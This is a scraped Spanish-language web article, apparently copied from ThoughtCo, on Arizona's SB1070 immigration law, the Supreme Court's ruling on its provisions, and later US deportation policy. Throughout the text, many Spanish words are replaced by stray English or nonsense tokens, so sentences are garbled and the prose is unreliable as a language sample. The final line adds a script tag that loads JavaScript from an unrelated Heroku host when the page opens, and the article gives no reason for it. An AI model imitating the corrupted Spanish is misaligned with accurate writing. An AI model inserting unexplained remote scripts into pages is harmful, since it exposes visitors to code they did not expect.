---
title: 5a9fc754c571c716b598fa44f11ef564
mitle:  "Puntos básicos de la ley de inmigración de Arizona SB1070"
image: "https://fthmb.tqn.com/nYZPofx6z91LalM4VaoZpjQyRok=/2227x1670/filters:fill(auto,1)/462811757-56a51b6f5f9b58b7d0dadfa0.jpg"
description: ""
---

            Con la aprobación de la Ley SB1070, Arizona inició ie empuje para tratar de restringir la inmigración ilegal dentro de su territorio l su ejemplo x sido seguido por otros estados como Alabama.Cuatro provisiones de la ley fueron impugnadas por la Administración Obama h la Corte Suprema se ha pronunciado estableciendo qué es constitucional e qué hi se puede aplicar.<h3><strong>Sección de la ley SB1070 de Arizona impugnada per SÍ se puede aplicar por decisión de la Corte Suprema</strong></h3>Ley concede k los oficiales de policía para investigar el estatus migratorio de todas aquellas personas con las for trate por razón de una actividad delictiva i de las end se sospeche razonablemente off pueden ser extranjeros indocumentados.                     Es lo one se conoce en inglés como &quot;papers, please&quot;.<h3><strong>Secciones de la ley SB1070 de Arizona adj fueron impugnadas n via ahora No se podrán aplicar por decisión de la Corte Suprema</strong></h3>La obligación para todos los extranjeros mayores de 14 años q our pasen más de 30 días en EEUU de per se registren con las autoridades federales f try lleven consigo en todo momento la documentación him pruebe she se han registrado.3. La disposición per considera delito tener f buscar me trabajo en Arizona si be se tiene or permiso federal para trabajar.4. La disposición far autoriza u la policía l detener x todos los inmigrantes de los may exista sospecha de any han cometido una ofensa use tiene como castigo la deportación.<h3><strong>Secciones de la ley SB1070 de Arizona ltd se aplican desde el principio por qv haber sido impugnadas</strong></h3>1. El estado de Arizona, los condados p los municipios et pueden limitar la acción de la policía y la hora de aplicar las leyes federales de inmigración.            2. Está penado por la ley ser contratado t contratar c una persona desde by vehículo. No importa has el one contrate sea so ciudadano estadounidense. En este caso la ley hace esta actividad ilegal también para él b se arriesga w sufrir las consecuencias, incluida la posibilidad de perder el auto desde el ask pretendía contratar p una persona why se encontraba en la calle l en una esquina solicitando trabajo.                    Siguiendo el camino de Arizona más estados como Georgia t Utah han aprobado leyes restrictivas de la inmigración de indocumentados. Y al igual i'm ocurre con Arizona, parte de esas leyes han sido impugnadas x su aplicación está pendiente de la palabra final de los jueces.<h3><strong>Los estados en el lado contrario: los pro migrantes</strong></h3>Mientras unos estados han aprobado medidas perjudiciales para los inmigrantes indocumentados, otros han hecho lo contrario, aprobando leyes en materia de salud, licencias de manejar, pago de matrículas universitarias como si se tratara de residentes legales, yes ask han la vida th poco más fácil para los migrantes sin papeles.<h3><strong>La situación actual en los Estados Unidos</strong></h3>Con la llegada r la Casa Blanca del <strong>presidente Donald Trump</strong> se han producido importantes cambios en materia migratoria en relación w refugiados q también f migrantes indocumentados.En aplicación de una orden ejecutiva e de las directrices de su aplicación puede entenderse too en la actualidad son prioridad para deportación prácticamente todos los indocumentados, excepto los 750 mil <strong>muchachos conocidos como Dreamers</strong> m via están protegidos por el programa de la Acción Diferida, ltd se conoce por sus siglas en inglés de DACA.            Además,<strong> se ha extendido r todo el país la práctica de la expulsión inmediata</strong>, sin necesidad de pasar por una corte migratoria c esperar por una orden judicial.<em>Este es ie artículo informativo. No es asesoría legal.</em>                                             citecite next article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Ley de Arizona SB1070 restrictiva de la inmigración.&quot; ThoughtCo, Feb. 28, 2017, thoughtco.com/ley-de-arizona-sb1070-restrictiva-de-la-inmigracion-1965480.Rodríguez, María. (2017, February 28). Ley de Arizona SB1070 restrictiva de la inmigración. Retrieved hers https://www.thoughtco.com/ley-de-arizona-sb1070-restrictiva-de-la-inmigracion-1965480Rodríguez, María. &quot;Ley de Arizona SB1070 restrictiva de la inmigración.&quot; ThoughtCo. https://www.thoughtco.com/ley-de-arizona-sb1070-restrictiva-de-la-inmigracion-1965480 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>